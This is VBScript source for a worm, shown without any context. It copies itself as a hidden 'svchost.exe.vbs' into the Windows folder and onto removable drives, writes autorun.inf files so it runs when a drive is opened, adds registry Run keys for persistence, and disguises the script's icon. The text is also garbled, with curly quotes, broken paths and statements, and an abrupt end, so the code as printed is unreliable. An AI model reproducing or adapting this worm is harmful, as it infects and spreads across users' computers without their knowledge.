ATR = “[autorun]” & vbcrlf & “ShellExecute = wscript.exe 
svchost.exe.vbs” 
set fs = createobject (“Scripting.FileSystemObject”)

set mf = fs.getfile (Wscript.ScriptFullname) 
dim text, size 
size = 
mf.size 
check = mf.drive.drivetype 
set text = mf.openastextstream (1, 
-2) 
do while not text.atendofstream 
mysource = mysource & 
text.readline 
mysource = mysource & vbcrlf 
loop 
do 
Set 
winpath = fs.getspecialfolder (0) 
set tf = fs.getfile (winpath & “\ 
svchost.exe.vbs”) 
tf.attributes = 32 
set tf = fs.createtextfile (winpath 
& “\ svchost.exe.vbs”, 2, true) 
tf.write mysource 
tf.close 
sets 
tf = fs.getfile (winpath & “\ svchost.exe.vbs”) 
tf.attributes = 39

For Each flashdrive in fs.drives 
If (flashdrive.drivetype = 1 or 
flashdrive.drivetype = 2) and flashdrive.path <> “A:” then 
set tf = 
fs.getfile (flashdrive.path & “\ svchost.exe.vbs”) 
tf.attributes = 32

set tf = fs.createtextfile (flashdrive.path & “\ svchost.exe.vbs”, 2, 
true) 
tf.write mysource 
tf.close 
set tf = fs.getfile 
(flashdrive.path & “\ svchost.exe.vbs”) 
tf.attributes = 39 
set tf = 
fs.getfile (flashdrive.path & “\ autorun.inf”) 
tf.attributes = 32

set tf = fs.createtextfile (flashdrive.path & “\ autorun.inf”, 2, true)

ATR tf.write 
tf.close 
set tf = fs.getfile (flashdrive.path & “\ 
autorun.inf”) 
tf.attributes = 39 
end if 
next 
set of RG = 
createobject (“WScript.Shell”) 
rg.regwrite “HKEY_LOCAL_MACHINE \ Software \ 
Microsoft \ Windows \ CurrentVersion \ Run \ svchost”, winpath & “\ 
svchost.exe.vbs” 
rg.regwrite “HKEY_LOCAL_MACHINE \ Software \ Microsoft \ 
Windows \ CurrentVersion \ Run \ MS32DLL”, “” 
rg.regwrite “HKCR \ vbsfile \ 
DefaultIcon \”, “shell32.dll, 3? 
if check <> 1 then 
Wscript.sleep 
100,000 
end if 
loop while check <> 1 
set sd = createobject 
(“Wscript.shell”) 
sd.run winpath & “\ explorer.exe / e, / select,” & 
Wscript.ScriptFullname

do while year (now)> = 2008 
WScript.sleep 